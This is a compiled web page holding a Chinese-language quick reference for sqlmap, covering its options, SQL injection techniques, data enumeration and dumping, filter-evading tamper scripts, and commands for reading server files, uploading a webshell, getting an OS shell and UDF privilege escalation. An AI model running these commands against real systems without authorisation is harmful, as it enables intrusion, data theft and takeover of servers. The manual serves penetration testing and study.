import{b as u}from"./chunks/theme.BiY6TBf-.js";import{_ as m}from"./chunks/articleMetadata.BZXad0n-.js";import{_ as h,C as g,c as v,o as e,j as i,G as r,ah as q,a as k,w as t,b as o,e as c}from"./chunks/framework.97i6h3Kv.js";const w=JSON.parse('{"title":"SQLmap简要手册","description":"本文提供 sqlmap 工具的简要手册，包括其功能、选项摘要、用例以及如何通过该工具进行 SQL 注入检测和数据获取","frontmatter":{"sort":1,"title":"SQLmap简要手册","description":"本文提供 sqlmap 工具的简要手册，包括其功能、选项摘要、用例以及如何通过该工具进行 SQL 注入检测和数据获取","date":"2025-04-06T12:11:20.000Z","tags":["SQLmap","Pentest-Tools"],"isOriginal":false,"author":"wgpsec","articleLink":"\\"https://github.com/wgpsec/wiki/blob/master/docs/knowledge/tools/sqlmap.md\\"","articleGPT":"WgpSec Wiki 仓库中的 `sqlmap.md` 文件提供了 sqlmap 工具的简要手册，包括其功能、选项摘要、用例以及如何通过该工具进行 SQL 注入检测和数据获取。文档详细介绍了 sqlmap 的工作原理、如何设置输出信息的详细程度、目标指定方式、请求参数设置、注入参数指定、检测技术、枚举数据库信息等。此外，还介绍了如何通过 sqlmap 接管操作系统、使用 UDF 提权以及 tamper 脚本的使用方法。"},"headers":[],"relativePath":"pentest-tools/top/sqlmap.md","filePath":"posts/pentest-tools/top/sqlmap/README.md","lastUpdated":1744209906000}'),S={name:"pentest-tools/top/sqlmap.md"};function T(a,n,y,f,P,C){const d=m,p=g("ClientOnly"),b=u;return e(),v("div",null,[n[0]||(n[0]=i("h1",{id:"sqlmap简介",tabindex:"-1"},[k("SQLmap简介 "),i("a",{class:"header-anchor",href:"#sqlmap简介","aria-label":'Permalink to "SQLmap简介"'},"​")],-1)),r(p,null,{default:t(()=>{var s,l;return[(((s=a.$frontmatter)==null?void 0:s.aside)??!0)&&(((l=a.$frontmatter)==null?void 0:l.showArticleMetadata)??!0)?(e(),o(d,{key:0,article:a.$frontmatter},null,8,["article"])):c("",!0)]}),_:1}),r(p,null,{default:t(()=>{var s;return[(s=a.$frontmatter)!=null&&s.articleGPT?(e(),o(b,{key:0})):c("",!0)]}),_:1}),n[1]||(n[1]=q(`<p><strong>当给sqlmap一个URL，它会干些什么？</strong></p><blockquote><p>1）判断可注入的参数</p><p>2）判断可以用那种SQL注入技术来注入</p><p>3）识别出哪种数据库</p><p>4）根据用户选择，读取哪些数据</p></blockquote><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>--purge        #清除历史缓存</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><h2 id="选项摘要" tabindex="-1">选项摘要 <a class="header-anchor" href="#选项摘要" aria-label="Permalink to &quot;选项摘要&quot;">​</a></h2><h4 id="输出信息的详细程度" tabindex="-1">输出信息的详细程度 <a class="header-anchor" href="#输出信息的详细程度" aria-label="Permalink to &quot;输出信息的详细程度&quot;">​</a></h4><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>-v    #共7个级别(0~6)，默认为1</span></span>
<span class="line"><span>#可以用 -vv 代替 -v 2，推荐使用这种方法</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ul><li><strong>0</strong> ：只输出 Python 出错回溯信息，错误和关键信息</li><li><strong>1</strong> ：增加输出普通信息和警告信息</li><li><strong>2</strong> ：增加输出调试信息</li><li><strong>3</strong> ：增加输出已注入的 payloads</li><li><strong>4</strong> ：增加输出 HTTP 请求</li><li><strong>5</strong> ：增加输出 HTTP 响应头</li><li><strong>6</strong> ：增加输出 HTTP 响应内容</li></ul><h4 id="目标" tabindex="-1">目标 <a class="header-anchor" href="#目标" aria-label="Permalink to &quot;目标&quot;">​</a></h4><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>-d    #直连数据库，&quot;mysql://root:root@192.168.0.8:3306/testdb&quot;</span></span>
<span class="line"><span>-u URL</span></span>
<span class="line"><span>-l    #从Burp代理日志文件中解析目标地址</span></span>
<span class="line"><span>-m    #从文本文件中批量获取目标</span></span>
<span class="line"><span>-r    #从文件中读取 HTTP 请求</span></span>
<span class="line"><span></span></span>
<span class="line"><span>--purge            #清除历史缓存</span></span>
<span class="line"><span>--flush-session    #清除上次扫描的缓存</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h4 id="请求" tabindex="-1">请求 <a class="header-anchor" href="#请求" aria-label="Permalink to &quot;请求&quot;">​</a></h4><p>指定连接目标地址的方式</p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>--method=METHOD        #强制使用提供的 HTTP 方法（例如：PUT）</span></span>
<span class="line"><span>--data=DATA            #使用 POST 发送数据串；--data=&quot;id=1&amp;user=admin&quot;</span></span>
<span class="line"><span>--param-del=&quot;;&quot;        #使用参数分隔符，--data=&quot;id=1;user=admin&quot;</span></span>
<span class="line"><span>--cookie=COOKIE        #指定 HTTP Cookie ，--cookie &quot;id=11&quot; --level 2</span></span>
<span class="line"><span>--drop-set-cookie    #忽略 HTTP 响应中的 Set-Cookie 参数</span></span>
<span class="line"><span>--user-agent=AGENT    #指定 HTTP User-Agent</span></span>
<span class="line"><span>--random-agent        #使用随机的 HTTP User-Agent，随机从 ./txt/user-agents.txt 选一个，不是每次请求换一个</span></span>
<span class="line"><span>--referer=REFERER    #指定 HTTP Referer</span></span>
<span class="line"><span>-H HEADER            #设置额外的 HTTP 头参数（例如：&quot;X-Forwarded-For: 127.0.0.1&quot;）</span></span>
<span class="line"><span>--headers=HEADERS    #设置额外的 HTTP 头参数,必须以换行符分隔（例如：&quot;Accept-Language: fr\\nETag: 123&quot;）</span></span>
<span class="line"><span>--delay=10            #设置每个 HTTP 请求的延迟秒数</span></span>
<span class="line"><span>--safe-freq=SAFE    #每访问两次给定的合法 URL 才发送一次测试请求</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h4 id="注入" tabindex="-1">注入 <a class="header-anchor" href="#注入" aria-label="Permalink to &quot;注入&quot;">​</a></h4><p>以下选项用于指定要测试的参数</p><p>提供自定义注入 payloads 和篡改参数的脚本</p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>-p TESTPARAMETER    #指定需要测试的参数</span></span>
<span class="line"><span>--skip=SKIP            #指定要跳过的参数</span></span>
<span class="line"><span>--dbms=DBMS            #指定 DBMS 类型（例如：MySQL）</span></span>
<span class="line"><span>--os=OS                #指定 DBMS 服务器的操作系统类型</span></span>
<span class="line"><span>--prefix=PREFIX        #注入 payload 的前缀字符串</span></span>
<span class="line"><span>--suffix=SUFFIX        #注入 payload 的后缀字符串</span></span>
<span class="line"><span>--tamper=TAMPER        #用给定脚本修改注入数据</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h4 id="检测" tabindex="-1">检测 <a class="header-anchor" href="#检测" aria-label="Permalink to &quot;检测&quot;">​</a></h4><p>sqlmap 使用的 payloads 直接从文本文件 <code>xml/payloads.xml</code> 中载入。</p><p>根据该文件顶部的相关指导说明进行设置，如果 sqlmap 漏过了特定的注入，</p><p>你可以选择自己修改指定的 payload 用于检测。</p><p><strong>level有5级，越高检测越全，默认为 1</strong></p><blockquote><p>--level 1 检测Get和Post</p><p>--level 2 检测HTTP Cookie</p><p>--level 3 检测User-Agent和Referer</p><p>--level 4 检测</p><p>--level 5 检测 HOST 头</p></blockquote><p><strong>risk有3级，级别越高风险越大，默认为1</strong></p><blockquote><p>--risk 2 会在默认的检测上添加大量时间型盲注语句测试</p><p>--risk 3 会在原基础上添加 <code>OR</code> 类型的布尔型盲注 ，可能会update导致修改数据库</p></blockquote><h4 id="技术" tabindex="-1">技术 <a class="header-anchor" href="#技术" aria-label="Permalink to &quot;技术&quot;">​</a></h4><p>以下选项用于调整特定 SQL 注入技术的测试方法</p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>--technique=TECH    #使用的 SQL 注入技术（默认为“BEUSTQ”)</span></span>
<span class="line"><span>E: Error-based SQL injection（报错型注入）</span></span>
<span class="line"><span>U: UNION query SQL injection（联合查询注入）</span></span>
<span class="line"><span>S: Stacked queries SQL injection（堆查询注入）</span></span>
<span class="line"><span>T: Time-based blind SQL injection（时间型盲注）</span></span>
<span class="line"><span>Q: inline Query injection（内联查询注入）</span></span>
<span class="line"><span></span></span>
<span class="line"><span>--time-sec=TIMESEC  #设置延时注入的时间（默认为 5）</span></span>
<span class="line"><span>--second-order=S..  #设置二阶响应的结果显示页面的 URL（该选项用于二阶 SQL 注入）</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h4 id="枚举" tabindex="-1">枚举 <a class="header-anchor" href="#枚举" aria-label="Permalink to &quot;枚举&quot;">​</a></h4><p>以下选项用于获取数据库的信息，结构和数据表中的数据。</p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>-a, --all          #获取所有信息、数据</span></span>
<span class="line"><span>-b, --banner        #获取 DBMS banner,返回数据库的版本号</span></span>
<span class="line"><span>--current-user            #获取 DBMS 当前用户</span></span>
<span class="line"><span>--current-db            #获取 DBMS 当前数据库</span></span>
<span class="line"><span>--hostname                #获取 DBMS 服务器的主机名</span></span>
<span class="line"><span>--is-dba                #探测 DBMS 当前用户是否为 DBA（数据库管理员）</span></span>
<span class="line"><span>--users                    #枚举出 DBMS 所有用户</span></span>
<span class="line"><span>--passwords                #枚举出 DBMS 所有用户的密码哈希</span></span>
<span class="line"><span>--privileges            #枚举出 DBMS 所有用户特权级</span></span>
<span class="line"><span>--roles                    #枚举出 DBMS 所有用户角色</span></span>
<span class="line"><span></span></span>
<span class="line"><span>--dbs                    #枚举出 DBMS 所有数据库</span></span>
<span class="line"><span>--tables                #枚举出 DBMS 数据库中的所有表</span></span>
<span class="line"><span>--columns                #枚举出 DBMS 表中的所有列</span></span>
<span class="line"><span>--schema                #枚举出 DBMS 所有模式</span></span>
<span class="line"><span>--count                    #获取数据表数目</span></span>
<span class="line"><span>--dump                    #导出 DBMS 数据库表项</span></span>
<span class="line"><span>--stop 10                #只取前10行数据</span></span>
<span class="line"><span>    </span></span>
<span class="line"><span>-D DB                    #指定要枚举的 DBMS 数据库</span></span>
<span class="line"><span>-T TBL                    #指定要枚举的 DBMS 数据表</span></span>
<span class="line"><span>-C COL                    #指定要枚举的 DBMS 数据列</span></span>
<span class="line"><span>    </span></span>
<span class="line"><span>--sql-query=QUERY        #指定要执行的 SQL 语句</span></span>
<span class="line"><span>--sql-shell                #调出交互式 SQL shell</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><h2 id="用例" tabindex="-1">用例 <a class="header-anchor" href="#用例" aria-label="Permalink to &quot;用例&quot;">​</a></h2><p><strong>从文件读取HTTP请求，GET和POST都可以</strong></p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>sqlmap -r &quot;burp.txt&quot; -p &quot;username&quot;    #-p 指定存在注入的参数</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p><strong>Cookie注入</strong></p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>sqlmap -u &quot;http://www.vuln.com&quot; --cookie &quot;id=11&quot; --level 2</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p><strong>当防火墙，对请求速度做了限制</strong></p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>sqlmap -u &quot;http://www.vuln.com/post.php?id=1&quot; --delay=10</span></span>
<span class="line"><span>#在每个HTTP请求之间的延迟10秒</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="伪静态注入" tabindex="-1">伪静态注入 <a class="header-anchor" href="#伪静态注入" aria-label="Permalink to &quot;伪静态注入&quot;">​</a></h2><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>sqpmap  -u http://victim.com/id/666*.html --dbs  #在html扩展名前加个&#39;*&#39;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><h2 id="访问文件系统" tabindex="-1">访问文件系统 <a class="header-anchor" href="#访问文件系统" aria-label="Permalink to &quot;访问文件系统&quot;">​</a></h2><p>仅对MySQL、MSSQL、PosgreSQL有效</p><p>数据库用户有读写权限，有目录读写文件权限</p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>sqlmap -u url --is-dba</span></span>
<span class="line"><span>#查看是否dba权限,必须为root权限</span></span>
<span class="line"><span></span></span>
<span class="line"><span>sqlmap -u url --file-read &quot;C:/Windows/win.ini&quot;        </span></span>
<span class="line"><span>#读取文件</span></span>
<span class="line"><span></span></span>
<span class="line"><span>sqlmap -u url --file-write=D:/shell.php --file-dest=C:/www/shell.php</span></span>
<span class="line"><span>#上传文件 (本地木马路径:目标网站目录)</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="接管操作系统" tabindex="-1">接管操作系统 <a class="header-anchor" href="#接管操作系统" aria-label="Permalink to &quot;接管操作系统&quot;">​</a></h2><p>仅对MySQL、MSSQL、PosgreSQL有效</p><p>数据库用户有读写权限，有目录读写文件权限</p><p>sqlmap 能够在 <strong>数据库所在服务器的操作系统上运行任意的命令</strong></p><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>sqlmap -u &quot;URL&quot; --os-shell    #获取系统交互shell或--os-cmd=id执行系统命令</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><p><a href="https://blog.sari3l.com/posts/8dea0d95/" target="_blank" rel="noreferrer">原理</a> 就是上传一个upload木马后，再上传一个cmd shell；</p><p>当 --os-shell 退出后， 会调用后门脚本删除上传文件后，进行自删除。</p><blockquote><p>在 MySQL 和 PostgreSQL 中，sqlmap 可以上传一个包含两个用户自定义函数</p><p>分别为 <code>sys_exec()</code> 和 <code>sys_eval()</code> 的共享库（二进制文件）</p><p>然后在数据库中创建出两个对应函数，并调用对应函数执行特定的命令，并允许用户选择是否打印出相关命令执行的结果。</p><p>在 Microsoft SQL Server 中，sqlmap 会利用 <code>xp_cmdshell</code> 存储过程：</p><p>如果该存储过程被关闭了（Microsoft SQL Server 的 2005 及以上版本默认关闭），sqlmap 则会将其重新打开；</p><p>如果该存储过程不存在，sqlmap 则会重新创建它。</p><p>当用户请求标准输出，sqlmap 将使用任何可用的 SQL 注入技术（盲注、带内注入、报错型注入）去获取对应结果。</p><p>相反，如果无需标准输出对应结果，sqlmap 则会使用堆叠查询注入（Stacked queries）技术执行相关的命令。</p><p>如果堆叠查询没有被 Web 应用识别出来，并且 DBMS 为 MySQL，</p><p>假如后端 DBMS 和 Web 服务器在同一台服务器上，</p><p>则仍可以通过利用 <code>SELECT</code> 语句中的 <code>INTO OUTFILE</code> ，在 根目录可写目录中写shell</p></blockquote><h2 id="udf提权" tabindex="-1">UDF提权 <a class="header-anchor" href="#udf提权" aria-label="Permalink to &quot;UDF提权&quot;">​</a></h2><p>使用选项 <code>--udf-inject</code> 并按照说明进行操作即可；</p><p>如果需要，也可以使用 <code>--shared-lib</code> 选项通过命令行指定共享库的本地文件系统路径。</p><p>否则 sqlmap 会在运行时向你询问路径。</p><p>此功能仅对 MySQL 或 PostgreSQL 有用。</p><h2 id="tamper脚本" tabindex="-1">tamper脚本 <a class="header-anchor" href="#tamper脚本" aria-label="Permalink to &quot;tamper脚本&quot;">​</a></h2><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>use age：sqlmap.py --tamper=&quot;模块名.py&quot;</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br></div></div><div class="language- vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>apostrophemask            #将单引号 url 编码</span></span>
<span class="line"><span>apostrophenullencode    #将单引号替换为宽字节 unicode 字符</span></span>
<span class="line"><span>base64encode            #base64 编码</span></span>
<span class="line"><span>between            #将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</span></span>
<span class="line"><span>bluecoat        #用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</span></span>
<span class="line"><span>charencode                #用 url 编码一次你的 payload</span></span>
<span class="line"><span>charunicodeencode        #用 unicode 编码 payload ，只编码非编码字符</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><a href="https://wooyun.js.org/drops/SQLMAP%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8.html" target="_blank" rel="noreferrer">自定义tamper</a></p>`,60))])}const D=h(S,[["render",T]]);export{w as __pageData,D as default};
